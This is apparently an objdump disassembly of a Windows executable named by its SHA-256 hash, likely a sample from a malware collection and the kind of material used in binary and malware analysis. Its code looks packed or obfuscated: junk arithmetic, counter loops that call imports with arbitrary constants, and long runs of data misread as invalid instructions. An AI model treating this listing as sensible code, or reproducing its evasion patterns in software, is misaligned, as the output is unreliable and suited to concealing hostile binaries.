
a6779aac02e02b31025a700fb8d5f7ff327f8cf269b8e974e1613f2f25c2d37d.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	xor    ecx,DWORD PTR ds:0x4336db
  40100c:	mov    eax,ds:0x413b16
  401011:	xor    DWORD PTR ds:0x433773,edx
  401017:	mov    eax,DWORD PTR [eax+0x198]
  40101d:	mov    ecx,DWORD PTR ds:0x433727
  401023:	or     DWORD PTR ds:0x4336d3,ecx
  401029:	mov    DWORD PTR [ebp-0x8],eax
  40102c:	mov    DWORD PTR ds:0x4336c3,0x436b
  401036:	jmp    0x40133c
  40103b:	mov    ah,0xd6
  40103d:	ja     0x40109f
  40103f:	jno    0x4010ae
  401041:	mov    bl,0xd2
  401043:	js     0x4010a2
  401045:	repz sbb DWORD PTR [edx-0x6c],ebp
  401049:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40104a:	pusha  
  40104b:	jl     0x4010c9
  40104d:	jl     0x4010cb
  40104f:	addr16 jle 0x4010ce
  401052:	jl     0x401020
  401054:	xlat   BYTE PTR ds:[ebx]
  401055:	cmp    ecx,edx
  401057:	(bad)
  40105a:	ffree  st(2)
  40105c:	pop    es
  40105d:	push   es
  40105e:	add    ecx,DWORD PTR ds:0x330f028e
  401064:	cmpps  xmm3,XMMWORD PTR [edx],0xc7
  401068:	adc    bl,BYTE PTR [edi]
  40106a:	inc    ebp
  40106b:	pop    edx
  40106c:	add    dh,BYTE PTR [edi-0x4610f327]
  401072:	fcmovnbe st,st(4)
  401074:	add    ecx,DWORD PTR [esp+0x4da0f6bc]
  40107b:	adc    DWORD PTR [ecx+0x641f44dc],ebp
  401081:	out    dx,al
  401082:	outs   dx,DWORD PTR ds:[esi]
  401083:	or     ebx,DWORD PTR ds:0x42d47a9e
  401089:	test   al,0x53
  40108b:	sub    ebp,ebx
  40108d:	(bad)  
  40108e:	ds test eax,0xabc17b88
  401094:	add    al,0xc6
  401096:	ror    DWORD PTR [ebp-0x3a6d2b7b],cl
  40109c:	jmp    0x4010d0
  40109e:	mov    esi,ebp
  4010a0:	dec    edi
  4010a1:	in     al,0xa4
  4010a3:	dec    ebp
  4010a4:	call   DWORD PTR [edi-0x274af866]
  4010aa:	mov    ecx,0x5134e949
  4010af:	and    esi,DWORD PTR [eax-0x41639318]
  4010b5:	jnp    0x4010d4
  4010b7:	ret    
  4010b8:	nop
  4010b9:	sub    eax,0xc05cebd6
  4010be:	out    0xba,al
  4010c0:	bnd call 0x770f4e56
  4010c6:	popa   
  4010c7:	xlat   BYTE PTR ds:[ebx]
  4010c8:	and    cl,cl
  4010ca:	add    ch,ah
  4010cc:	sbb    eax,0x331a45d
  4010d1:	outs   dx,DWORD PTR ds:[esi]
  4010d2:	ins    DWORD PTR es:[edi],dx
  4010d3:	jp     0x4010df
  4010d5:	cmp    eax,0x2a568cd9
  4010da:	jno    0x40115b
  4010dc:	cmp    al,0x8f
  4010de:	or     bl,bl
  4010e0:	mov    ah,0xb
  4010e2:	pop    ebx
  4010e3:	push   ecx
  4010e4:	(bad)  
  4010e6:	adc    eax,0x25e55ed3
  4010eb:	jge    0x401089
  4010ed:	inc    esp
  4010ee:	dec    ebx
  4010ef:	aaa    
  4010f0:	adc    DWORD PTR [ebx],ebp
  4010f2:	ja     0x401129
  4010f4:	sbb    bl,dl
  4010f6:	cmp    al,0x4f
  4010f8:	jmp    0x4bce:0x96eda6c9
  4010ff:	inc    esp
  401100:	pop    esi
  401101:	loop   0x401167
  401103:	lock in eax,0x4b
  401106:	adc    DWORD PTR [ebx+0x10],esp
  401109:	ret    
  40110a:	push   esi
  40110b:	hlt    
  40110c:	mov    ecx,0xd43895cf
  401111:	into   
  401112:	imul   eax,DWORD PTR [edx+0x1cd95af7],0xffffffe7
  401119:	cmp    edi,DWORD PTR [eax-0x5fe22340]
  40111f:	inc    esi
  401120:	fcmovne st,st(7)
  401122:	ins    DWORD PTR es:[edi],dx
  401123:	mov    ?,WORD PTR [edx-0x27d53b7d]
  401129:	cmp    DWORD PTR [edi],ecx
  40112b:	sbb    edx,ebx
  40112d:	lock push ebx
  40112f:	enter  0xfc81,0x3e
  401133:	ins    DWORD PTR es:[edi],dx
  401134:	mov    ebp,DWORD PTR [eax]
  401136:	add    bh,ah
  401138:	sar    DWORD PTR [ecx],1
  40113a:	gs xor al,0xf2
  40113d:	pop    ecx
  40113e:	push   edi
  40113f:	(bad)  
  401140:	loope  0x4010f2
  401142:	jns    0x4010c8
  401144:	and    BYTE PTR [ebx+0x2b],0xde
  401148:	ret    
  401149:	(bad)  
  40114b:	cld    
  40114c:	and    ebx,DWORD PTR [ebx+ecx*2]
  40114f:	test   al,0xe
  401151:	sbb    BYTE PTR [esi],cl
  401153:	iret   
  401154:	mov    ds:0xb6c60d5,eax
  401159:	sti    
  40115a:	xor    BYTE PTR [esi+0x73],dl
  40115d:	push   ss
  40115e:	adc    edi,DWORD PTR [eax-0x14a91643]
  401164:	movq   mm4,QWORD PTR [ebp-0x75]
  401168:	or     al,0x24
  40116a:	mov    eax,ds:0x5bed4b8b
  40116f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401170:	stos   BYTE PTR es:[edi],al
  401171:	push   edi
  401172:	je     0x401187
  401174:	test   BYTE PTR [edi+ecx*8+0x43],dh
  401178:	lock inc esi
  40117a:	add    eax,0x89502f
  40117f:	(bad)  
  401180:	call   0x83fb92ad
  401185:	pop    edi
  401186:	jnp    0x40115b
  401188:	(bad)  
  401189:	add    ch,BYTE PTR [ebp-0x5d]
  40118c:	mov    DWORD PTR [edx-0x57],esi
  40118f:	jae    0x4011af
  401191:	adc    ebx,DWORD PTR [eax+ebp*8]
  401194:	(bad)  
  401196:	fcomp  DWORD PTR [esi-0x43]
  401199:	leave  
  40119a:	add    al,0x31
  40119c:	inc    ecx
  40119d:	test   BYTE PTR [esi-0x169c14ce],ah
  4011a3:	(bad)
  4011a6:	push   edx
  4011a7:	in     al,0xf0
  4011a9:	test   DWORD PTR [ebp-0x76],esp
  4011ac:	pop    esi
  4011ad:	sub    edx,eax
  4011af:	mov    ds,WORD PTR [ebp+0x50]
  4011b2:	jg     0x4011df
  4011b4:	jne    0x401161
  4011b6:	pushf  
  4011b7:	(bad)  
  4011b8:	cmp    eax,0xee2aeb30
  4011bd:	mov    eax,0xbfa3d7
  4011c2:	jmp    DWORD PTR ds:0x85209a4d
  4011c8:	cld    
  4011c9:	lods   al,BYTE PTR ds:[esi]
  4011ca:	test   DWORD PTR [ebp-0x4145d006],ebx
  4011d0:	push   ebx
  4011d1:	or     DWORD PTR [eax+0x4723bba],edx
  4011d7:	add    DWORD PTR [ecx-0xb0f6c30],0xd8e499e8
  4011e1:	or     al,0xfb
  4011e3:	mov    esp,0xe02cb695
  4011e8:	out    dx,eax
  4011e9:	imul   ebp,DWORD PTR [ebp+ecx*4+0x6b6716a0],0xffffffab
  4011f1:	xchg   BYTE PTR [esi],ch
  4011f3:	add    edi,edx
  4011f5:	rcl    DWORD PTR [ecx+0x26],1
  4011f8:	dec    edi
  4011f9:	ficom  DWORD PTR [edx]
  4011fb:	cmp    dl,BYTE PTR ds:0x1abe2dc0
  401201:	dec    ebx
  401202:	mov    ah,0x9c
  401204:	rcl    BYTE PTR [esi-0x41],1
  401207:	imul   edx,DWORD PTR [edx+0x691375c3],0x38
  40120e:	sub    al,0x66
  401210:	test   BYTE PTR [bp+si],ch
  401213:	aam    0x6b
  401215:	jo     0x40128d
  401217:	mov    bl,0x13
  401219:	inc    edx
  40121a:	sbb    BYTE PTR [esi+0x69],al
  40121d:	add    ebp,DWORD PTR [esi]
  40121f:	mov    DWORD PTR [edi+0x72],edi
  401222:	data16 lahf 
  401224:	and    edx,DWORD PTR [ecx+0x4f811f02]
  40122a:	dec    edx
  40122b:	in     eax,dx
  40122c:	das    
  40122d:	stos   DWORD PTR es:[edi],eax
  40122e:	adc    eax,DWORD PTR [ebx]
  401230:	dec    ebx
  401231:	ss nop
  401233:	out    0x95,eax
  401235:	xchg   ebp,eax
  401236:	xchg   esi,eax
  401237:	js     0x401292
  401239:	mov    esp,0xa3d425fb
  40123e:	pop    ds
  40123f:	xor    eax,0x3db579ae
  401244:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401245:	mov    eax,ds:0x339e7e9d
  40124a:	push   edi
  40124b:	les    ebx,FWORD PTR [ecx+0x69]
  40124e:	inc    ecx
  40124f:	test   eax,0xf1ce587f
  401254:	pop    es
  401255:	dec    ebp
  401256:	push   ebx
  401257:	adc    eax,0x4ffd82be
  40125c:	nop
  40125d:	and    eax,0x90cb7530
  401262:	les    edi,FWORD PTR [ebx]
  401264:	test   eax,0xfe778f09
  401269:	or     eax,0x9ef59ac7
  40126e:	ret    
  40126f:	call   0x5319:0x902705be
  401276:	mov    dl,0x9
  401278:	adc    BYTE PTR [esp+eax*1-0x3c],0x56
  40127d:	pop    ecx
  40127e:	mov    ebp,0xc8c09dbd
  401283:	(bad)  
  401284:	push   ecx
  401285:	add    BYTE PTR [eax-0x33fe580f],dh
  40128b:	adc    ebp,eax
  40128d:	jmp    FWORD PTR [ecx+eiz*4-0x52]
  401291:	stos   BYTE PTR es:[edi],al
  401292:	jo     0x401246
  401294:	sbb    DWORD PTR [ebx+0x415006be],esi
  40129a:	mov    esi,DWORD PTR [edx-0x599fc46d]
  4012a0:	jecxz  0x401236
  4012a2:	sbb    eax,0x2542fcce
  4012a7:	mov    ecx,0x81357f69
  4012ac:	test   DWORD PTR [edi],ecx
  4012ae:	sar    edx,1
  4012b0:	outs   dx,BYTE PTR ds:[esi]
  4012b1:	fld    TBYTE PTR [esi]
  4012b3:	ror    esi,0xcd
  4012b6:	icebp  
  4012b7:	jne    0x401305
  4012b9:	push   ecx
  4012ba:	xor    bh,ch
  4012bc:	jae    0x4012f6
  4012be:	cdq    
  4012bf:	ffreep st(4)
  4012c1:	dec    esi
  4012c2:	pop    es
  4012c3:	pop    esp
  4012c4:	data16 mov ch,0x6c
  4012c7:	aas    
  4012c8:	and    eax,edi
  4012ca:	sbb    dl,dh
  4012cc:	hlt    
  4012cd:	mov    esi,0xed189379
  4012d2:	adc    bl,BYTE PTR [ebp+edx*4+0x55d93613]
  4012d9:	loope  0x40128e
  4012db:	push   es
  4012dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012dd:	nop
  4012de:	mov    edx,0x51539ff0
  4012e3:	aas    
  4012e4:	cmp    ebp,DWORD PTR [ebp+0x15]
  4012e7:	outs   dx,DWORD PTR ds:[esi]
  4012e8:	jmp    0x9acc:0x12bf383f
  4012ef:	jmp    0x39e0:0x9561fa6c
  4012f6:	mov    al,0xd8
  4012f8:	jmp    0xa05e:0xae905a7f
  4012ff:	cmp    DWORD PTR [esi-0x5b8edea6],edx
  401305:	sub    DWORD PTR [esi+0x40],ebp
  401308:	out    0x82,al
  40130a:	cmp    edx,DWORD PTR [ebx-0x63]
  40130d:	add    BYTE PTR es:[ebx],cl
  401310:	(bad)
  401313:	shr    BYTE PTR [esi],cl
  401315:	sub    al,0x69
  401317:	lea    edi,[ebx-0x4f]
  40131a:	sbb    eax,0x458ca0ca
  40131f:	sar    BYTE PTR [edi-0x3321725e],0x11
  401326:	mov    ah,0x8f
  401328:	xor    bl,BYTE PTR [esi+0x21456152]
  40132e:	push   es
  40132f:	jp     0x4013a1
  401331:	(bad)  
  401333:	xchg   ebp,eax
  401334:	pop    ss
  401335:	and    eax,0x8986d4d1
  40133a:	and    ah,ch
  40133c:	mov    eax,DWORD PTR [ebp+0x8]
  40133f:	mov    ecx,DWORD PTR [ebp-0x8]
  401342:	push   ebx
  401343:	or     DWORD PTR ds:0x433727,edx
  401349:	push   esi
  40134a:	add    esi,DWORD PTR ds:0x43371b
  401350:	mov    esi,0x7510853
  401355:	and    ebx,0x1c58
  40135b:	xor    eax,esi
  40135d:	and    DWORD PTR ds:0x43379f,0x0
  401367:	jmp    0x401379
  40136c:	mov    ebx,DWORD PTR ds:0x43379f
  401372:	inc    ebx
  401373:	mov    DWORD PTR ds:0x43379f,ebx
  401379:	cmp    DWORD PTR ds:0x43379f,0x11
  401380:	jae    0x4013b5
  401386:	cmp    DWORD PTR ds:0x43379f,0x16
  40138d:	jne    0x4013b0
  401393:	push   0x12df
  401398:	push   DWORD PTR [ebp-0x18]
  40139b:	push   0x49a7
  4013a0:	push   0x1ff7
  4013a5:	push   0x54a2
  4013aa:	call   DWORD PTR ds:0x41224c
  4013b0:	jmp    0x40136c
  4013b5:	push   edi
  4013b6:	or     edi,edi
  4013b8:	mov    edi,0x32729a
  4013bd:	not    ebx
  4013bf:	add    eax,edi
  4013c1:	adc    ebx,0x3cf3
  4013c7:	mov    DWORD PTR [ecx],eax
  4013c9:	sbb    DWORD PTR ds:0x4336e3,0x6b1e
  4013d3:	lea    eax,[ebp-0x4]
  4013d6:	mov    DWORD PTR [ebp-0x10],eax
  4013d9:	mov    eax,DWORD PTR [ebp+0x8]
  4013dc:	xor    DWORD PTR ds:0x43371f,0x46ad
  4013e6:	mov    ecx,DWORD PTR [ebp-0x10]
  4013e9:	xor    eax,esi
  4013eb:	add    eax,edi
  4013ed:	mov    DWORD PTR ds:0x433717,0x19
  4013f7:	cmp    DWORD PTR ds:0x433717,0x0
  4013fe:	je     0x40144d
  401404:	cmp    DWORD PTR ds:0x433717,0xb
  40140b:	jne    0x401421
  401411:	push   0x4336d3
  401416:	push   0x62b0
  40141b:	call   DWORD PTR ds:0x41217c
  401421:	cmp    DWORD PTR ds:0x433717,0xc
  401428:	jne    0x40143b
  40142e:	mov    ebx,DWORD PTR ds:0x433717
  401434:	dec    ebx
  401435:	mov    DWORD PTR ds:0x433717,ebx
  40143b:	mov    ebx,DWORD PTR ds:0x433717
  401441:	dec    ebx
  401442:	mov    DWORD PTR ds:0x433717,ebx
  401448:	jmp    0x4013f7
  40144d:	mov    DWORD PTR [ecx],eax
  40144f:	or     DWORD PTR ds:0x4336cf,0x4336c3
  401459:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  401460:	xor    DWORD PTR ds:0x4336d3,ebx
  401466:	lea    eax,[ebp-0x14]
  401469:	neg    ecx
  40146b:	mov    DWORD PTR [ebp-0x20],eax
  40146e:	mov    eax,DWORD PTR [ebp-0x14]
  401471:	mov    ecx,DWORD PTR [ebp-0x20]
  401474:	xor    eax,esi
  401476:	neg    ebx
  401478:	add    eax,edi
  40147a:	mov    DWORD PTR [ecx],eax
  40147c:	and    DWORD PTR ds:0x43379b,0x0
  401486:	xor    eax,eax
  401488:	add    eax,DWORD PTR ds:0x43379b
  40148e:	inc    eax
  40148f:	mov    ds:0x43379b,eax
  401494:	cmp    DWORD PTR ds:0x43379b,0x9
  40149b:	jne    0x4014ac
  4014a1:	push   0x8c0a
  4014a6:	call   DWORD PTR ds:0x412250
  4014ac:	cmp    DWORD PTR ds:0x43379b,0x8
  4014b3:	jne    0x4014c4
  4014b9:	mov    eax,ds:0x43379b
  4014be:	inc    eax
  4014bf:	mov    ds:0x43379b,eax
  4014c4:	cmp    DWORD PTR ds:0x43379b,0x1c
  4014cb:	jb     0x401486
  4014d1:	mov    eax,ds:0x413bea
  4014d6:	mov    ebx,0x8e12febe
  4014db:	sbb    DWORD PTR ds:0x43375f,0x47a9
  4014e5:	mov    DWORD PTR [ebp-0xc],ebx
  4014e8:	dec    DWORD PTR ds:0x4336db
  4014ee:	mov    eax,DWORD PTR [eax]
  4014f0:	mov    cx,WORD PTR [ebp-0x4]
  4014f4:	movzx  ecx,cx
  4014f7:	sbb    DWORD PTR ds:0x4336cf,0x43371f
  401501:	jmp    0x401807
  401506:	mov    dh,0x9a
  401508:	adc    cl,al
  40150a:	adc    BYTE PTR [ecx+0x7d],dh
  40150d:	jne    0x4014ba
  40150f:	arpl   ax,bx
  401511:	ins    DWORD PTR es:[edi],dx
  401512:	jg     0x401568
  401514:	and    dl,bh
  401516:	addr16 jle 0x401595
  401519:	jl     0x401582
  40151b:	jle    0x401599
  40151d:	jl     0x401542
  40151f:	out    0xa3,al
  401521:	pusha  
  401522:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401523:	push   0x7b
  401525:	mov    ds:0x9469b8e8,al
  40152a:	dec    esi
  40152b:	lods   al,BYTE PTR ds:[esi]
  40152c:	jno    0x4014d6
  40152e:	fwait
  40152f:	mov    ch,0x4c
  401531:	push   0x2725e3d7
  401536:	add    eax,0x80ed101a
  40153c:	pop    ecx
  40153d:	cmp    eax,0xf19cc6e1
  401542:	retf   0x39c
  401545:	mov    dl,0x75
  401547:	rol    BYTE PTR [edx-0x71],cl
  40154a:	jnp    0x4015ad
  40154c:	fbstp  TBYTE PTR [esi]
  40154e:	xchg   ebp,eax
  40154f:	dec    esi
  401550:	test   BYTE PTR [ecx],al
  401552:	sub    BYTE PTR [esi-0x73],cl
  401555:	shl    DWORD PTR [esi-0x41],cl
  401558:	rcl    BYTE PTR [ebp-0x9],1
  40155b:	iret   
  40155c:	arpl   WORD PTR [edx-0x6191c1e8],bp
  401562:	retf   0x5009
  401565:	push   ds
  401566:	cld    
  401567:	push   ebx
  401568:	inc    esi
  401569:	fcmovnb st,st(5)
  40156b:	sub    ebx,ebx
  40156d:	add    al,0x24
  40156f:	dec    edi
  401570:	xchg   esp,eax
  401571:	pop    ecx
  401572:	jne    0x401572
  401574:	stos   BYTE PTR es:[edi],al
  401575:	push   cs
  401576:	sbb    edi,DWORD PTR [ecx]
  401578:	xchg   esi,eax
  401579:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40157a:	sbb    ecx,esp
  40157c:	push   ebp
  40157d:	mov    DWORD PTR [ecx-0x1b],edi
  401580:	xchg   esi,eax
  401581:	push   ecx
  401582:	daa    
  401583:	mov    eax,ds:0x54318f81
  401588:	dec    edx
  401589:	push   ds
  40158a:	pop    es
  40158b:	pop    es
  40158c:	sub    edx,DWORD PTR [ecx+0x35]
  40158f:	jb     0x4015f4
  401591:	adc    eax,0x2560b262
  401596:	cwde   
  401597:	mov    ebx,0x5c404f38
  40159c:	jne    0x40152e
  40159e:	in     al,dx
  40159f:	aas    
  4015a0:	pop    edi
  4015a1:	push   eax
  4015a2:	repz ret 
  4015a4:	dec    ebp
  4015a5:	int3   
  4015a6:	test   DWORD PTR ds:0x5606234b,0x44d44d1c
  4015b0:	fxch   st(3)
  4015b2:	repnz push edi
  4015b4:	shl    BYTE PTR [eax+0x280b74fe],cl
  4015ba:	or     bl,dh
  4015bc:	mov    ds:0x6ccc82d6,al
  4015c1:	inc    esp
  4015c2:	pop    ds
  4015c3:	shl    BYTE PTR [esi+eiz*2-0x19292f19],0x1b
  4015cb:	sub    al,0x92
  4015cd:	mov    dl,0x88
  4015cf:	(bad)  
  4015d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015d1:	test   eax,0x40f124c2
  4015d6:	jae    0x4015c6
  4015d8:	aas    
  4015d9:	xor    DWORD PTR [edi-0x3e],esp
  4015dc:	sub    eax,0xf17bd1e0
  4015e1:	fwait
  4015e2:	sbb    al,0x16
  4015e4:	mov    ebx,0x2513f581
  4015e9:	jmp    0x5b2735e3
  4015ee:	push   es
  4015ef:	mov    bl,0x64
  4015f1:	mov    BYTE PTR [edi+0x53],dh
  4015f4:	and    dh,BYTE PTR [esi]
  4015f6:	or     al,0x59
  4015f8:	cmp    DWORD PTR [ecx],ebx
  4015fa:	add    BYTE PTR [edi-0x1],dl
  4015fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015fe:	inc    edx
  4015ff:	repnz pop ebx
  401601:	inc    ebx
  401602:	fwait
  401603:	call   0x86d8:0x1147645b
  40160a:	mov    ah,0xce
  40160c:	add    bh,BYTE PTR [edx+0xa]
  40160f:	xchg   esi,eax
  401610:	shr    DWORD PTR [esi-0x9],0x9
  401614:	adc    eax,0x90d66cbc
  401619:	ins    BYTE PTR es:[edi],dx
  40161a:	mov    ecx,DWORD PTR [edx]
  40161c:	mov    ch,0x4
  40161e:	push   cs
  40161f:	sbb    DWORD PTR [esi-0x211f709e],0x5cebcc3f
  401629:	pop    esi
  40162a:	outs   dx,DWORD PTR ds:[esi]
  40162b:	mov    esi,0xb8382574
  401630:	xchg   ebp,eax
  401631:	out    dx,al
  401632:	dec    ebx
  401633:	ins    BYTE PTR es:[edi],dx
  401634:	sbb    eax,0xa6248ac6
  401639:	popf   
  40163a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40163b:	ins    BYTE PTR es:[edi],dx
  40163c:	cmp    BYTE PTR [eax],bl
  40163e:	fmul   DWORD PTR [edi]
  401640:	mov    edx,0x78006c27
  401645:	fwait
  401646:	arpl   WORD PTR [ebp+edx*4+0x1f448614],di
  40164d:	push   ebp
  40164e:	jb     0x4015d1
  401650:	sbb    eax,0x1f1b0585
  401655:	retf   
  401656:	mov    ds:0x4bc8305e,al
  40165b:	int3   
  40165c:	adc    al,0x3
  40165e:	mov    bh,0xad
  401660:	imul   edx,DWORD PTR [ecx+eiz*8-0x54],0x8934ff49
  401668:	xor    al,0xac
  40166a:	pushf  
  40166b:	outs   dx,BYTE PTR ds:[esi]
  40166c:	bound  esp,QWORD PTR [ebp+ecx*8+0x5a]
  401670:	add    eax,0x14a138bb
  401675:	xor    BYTE PTR cs:[edi],ah
  401678:	adc    cl,dl
  40167a:	push   ebp
  40167b:	aas    
  40167c:	psubw  mm5,QWORD PTR [esi+0x2a241328]
  401683:	xchg   ebx,eax
  401684:	mov    ecx,0x26b0ad3a
  401689:	pop    edx
  40168a:	scas   eax,DWORD PTR es:[edi]
  40168b:	dec    ebx
  40168c:	or     bl,ah
  40168e:	mov    DWORD PTR [edi],ebx
  401690:	or     al,BYTE PTR ds:0x3f36adc9
  401696:	jb     0x40167a
  401698:	and    DWORD PTR [edi+edx*4-0x52],ebx
  40169c:	push   es
  40169d:	dec    eax
  40169e:	call   0x9d21585b
  4016a3:	pop    ebx
  4016a4:	out    dx,al
  4016a5:	in     al,dx
  4016a6:	aad    0x30
  4016a8:	adc    al,0x7
  4016aa:	cmp    cl,BYTE PTR ds:0x3501b930
  4016b0:	stc    
  4016b1:	pop    ebx
  4016b2:	adc    ch,BYTE PTR [ecx]
  4016b4:	sbb    dl,BYTE PTR [ebp+0x36be7e78]
  4016ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016bb:	push   0x129364ae
  4016c0:	sbb    dh,al
  4016c2:	aas    
  4016c3:	jecxz  0x40169c
  4016c5:	adc    eax,0x6ffffcb9
  4016ca:	in     eax,0x94
  4016cc:	adc    al,0x8b
  4016ce:	pop    esp
  4016cf:	xor    ch,dh
  4016d1:	inc    edi
  4016d2:	and    al,0xca
  4016d4:	cdq    
  4016d5:	cmp    DWORD PTR [ecx-0x343108a9],esi
  4016db:	mov    ch,0x9
  4016dd:	or     al,0xf8
  4016df:	ins    BYTE PTR es:[edi],dx
  4016e0:	xchg   edx,eax
  4016e1:	cwde   
  4016e2:	rcl    BYTE PTR [eax+0x498f5ff9],cl
  4016e8:	es pop esp
  4016ea:	in     al,dx
  4016eb:	cmp    eax,0xa6a61fdd
  4016f0:	out    0xe0,eax
  4016f2:	mov    ebx,0x5f8056e9
  4016f7:	push   0x2b
  4016f9:	mov    dh,0x8b
  4016fb:	out    dx,eax
  4016fc:	adc    al,BYTE PTR [ecx]
  4016fe:	adc    al,0x29
  401700:	pop    ebx
  401701:	jmp    0xb1fbac3c
  401706:	stc    
  401707:	fisub  DWORD PTR [edx]
  401709:	ins    DWORD PTR es:[edi],dx
  40170a:	mov    ds:0xc5794baa,eax
  40170f:	adc    ebx,0x2de71893
  401715:	jnp    0x40169c
  401717:	push   ecx
  401718:	lods   eax,DWORD PTR ds:[esi]
  401719:	repnz sbb BYTE PTR [ebx-0x453afdaf],0xa0
  401721:	jmp    0xa709:0xb2a03cd0
  401728:	popa   
  401729:	mov    bl,0x66
  40172b:	xchg   edi,eax
  40172c:	pop    ecx
  40172d:	jno    0x4016e1
  40172f:	mov    edx,0xe61168b4
  401734:	outs   dx,DWORD PTR ds:[esi]
  401735:	inc    dl
  401737:	loop   0x401768
  401739:	xor    bh,BYTE PTR ds:[ecx]
  40173c:	xor    eax,0x804338e4
  401741:	jbe    0x401752
  401743:	jmp    0x40178d
  401745:	xchg   edx,eax
  401746:	sahf   
  401747:	das    
  401748:	lods   eax,DWORD PTR ds:[esi]
  401749:	out    dx,eax
  40174a:	push   ecx
  40174b:	imul   eax,DWORD PTR fs:[ebx],0x46ee5e5e
  401752:	sbb    al,0xfa
  401754:	neg    BYTE PTR [ebx-0x8]
  401757:	push   edx
  401758:	mov    edx,0xda636b98
  40175d:	pop    eax
  40175e:	lds    ebx,FWORD PTR [ebx+0x55]
  401761:	and    BYTE PTR [edx+0x1e],0xdc
  401765:	sub    DWORD PTR ds:0x3cdb98b0,ebp
  40176b:	push   edi
  40176c:	sahf   
  40176d:	cmp    ebp,DWORD PTR [eax]
  40176f:	xor    eax,0xb4e6d530
  401774:	xor    esp,ebp
  401776:	mov    ah,0xbd
  401778:	mov    DWORD PTR [edi-0x5b68894a],ecx
  40177e:	jle    0x4017bb
  401780:	loopne 0x401764
  401782:	lods   eax,DWORD PTR ds:[esi]
  401783:	sub    al,0xcf
  401785:	rol    DWORD PTR [edx-0x78a91a87],cl
  40178b:	mov    ah,0x13
  40178d:	(bad)  
  40178e:	cmp    BYTE PTR [esp+ecx*8],ah
  401791:	pop    es
  401792:	or     ebx,DWORD PTR [ecx+0x58]
  401795:	add    dl,BYTE PTR [ebp-0x74]
  401798:	jbe    0x40178b
  40179a:	inc    edx
  40179b:	xchg   DWORD PTR [esi+0x24e1cfa2],edi
  4017a1:	lods   al,BYTE PTR ds:[esi]
  4017a2:	fs xchg ecx,eax
  4017a4:	fsub   DWORD PTR [eax-0x6cd5821d]
  4017aa:	repnz or DWORD PTR [edx+0x50c34038],ebp
  4017b1:	fadd   st(4),st
  4017b3:	pop    es
  4017b4:	aam    0x4f
  4017b6:	repnz outs dx,DWORD PTR ds:[esi]
  4017b8:	cmp    BYTE PTR [esi+0x1b],ch
  4017bb:	hlt    
  4017bc:	or     BYTE PTR ds:0xf9219c29,ch
  4017c2:	test   bl,cl
  4017c4:	lods   al,BYTE PTR ds:[esi]
  4017c5:	inc    ecx
  4017c6:	cmp    DWORD PTR [edx+0x6f5321e8],esi
  4017cc:	sbb    edx,esp
  4017ce:	jo     0x401765
  4017d0:	sbb    BYTE PTR [edi+0x5f96f037],al
  4017d6:	shl    DWORD PTR [eax-0x4c60d79f],cl
  4017dc:	out    dx,al
  4017dd:	inc    esi
  4017de:	in     al,0xce
  4017e0:	rcl    BYTE PTR [ebp-0x7f],1
  4017e3:	shl    DWORD PTR [esi],1
  4017e5:	(bad)  
  4017e6:	ds leave 
  4017e8:	or     eax,0xf4bfbb25
  4017ed:	call   0x2cf5:0x75e2ba6b
  4017f4:	push   ebx
  4017f5:	adc    DWORD PTR cs:[esi],ecx
  4017f8:	stos   BYTE PTR es:[edi],al
  4017f9:	xchg   edi,eax
  4017fa:	push   eax
  4017fb:	mov    esp,0x4f06e186
  401800:	lods   eax,DWORD PTR ds:[esi]
  401801:	push   esp
  401802:	cmp    al,0xa6
  401804:	mov    eax,0x8035165
  401809:	mov    eax,ds:0x4337d7
  40180e:	add    DWORD PTR ds:0x4336cb,eax
  401814:	mov    DWORD PTR [ebp-0x18],ecx
  401817:	mov    eax,DWORD PTR [ebp+0x8]
  40181a:	xor    DWORD PTR ds:0x43371b,0x1391
  401824:	mov    ecx,DWORD PTR [ebp-0x8]
  401827:	xor    eax,esi
  401829:	add    eax,edi
  40182b:	cmp    DWORD PTR [ecx],eax
  40182d:	mov    DWORD PTR ds:0x43371b,0x716
  401837:	jne    0x402597
  40183d:	mov    eax,DWORD PTR [ebp+0x8]
  401840:	add    DWORD PTR ds:0x4336e3,edi
  401846:	mov    ecx,DWORD PTR [ebp-0x18]
  401849:	or     DWORD PTR ds:0x4337af,0x433797
  401853:	xor    eax,esi
  401855:	add    eax,edi
  401857:	cmp    DWORD PTR [ecx],eax
  401859:	jne    0x401f33
  40185f:	sbb    ecx,DWORD PTR ds:0x43372b
  401865:	mov    eax,DWORD PTR [ebp+0x8]
  401868:	mov    DWORD PTR ds:0x433767,0x18
  401872:	cmp    DWORD PTR ds:0x433767,0x0
  401879:	je     0x4018bc
  40187f:	cmp    DWORD PTR ds:0x433767,0x28
  401886:	jne    0x4018a2
  40188c:	push   DWORD PTR [ebp-0x24]
  40188f:	push   DWORD PTR [ebp-0xc]
  401892:	push   0x6fcb
  401897:	push   0x70d4
  40189c:	call   DWORD PTR ds:0x4120b4
  4018a2:	xor    edx,edx
  4018a4:	add    edx,DWORD PTR ds:0x433767
  4018aa:	dec    edx
  4018ab:	mov    DWORD PTR ds:0x433767,edx
  4018b1:	jmp    0x401872
  4018b6:	adc    edx,0x63fa
  4018bc:	mov    ecx,DWORD PTR [ebp-0x10]
  4018bf:	and    DWORD PTR ds:0x433797,0x0
  4018c9:	jmp    0x4018db
  4018ce:	mov    edx,DWORD PTR ds:0x433797
  4018d4:	inc    edx
  4018d5:	mov    DWORD PTR ds:0x433797,edx
  4018db:	cmp    DWORD PTR ds:0x433797,0x15
  4018e2:	jae    0x401910
  4018e8:	cmp    DWORD PTR ds:0x433797,0x17
  4018ef:	jne    0x40190b
  4018f5:	push   0x4337ef
  4018fa:	push   DWORD PTR [ebp-0x10]
  4018fd:	push   0x6a0b
  401902:	push   DWORD PTR [ebp-0xc]
  401905:	call   DWORD PTR ds:0x4120b8
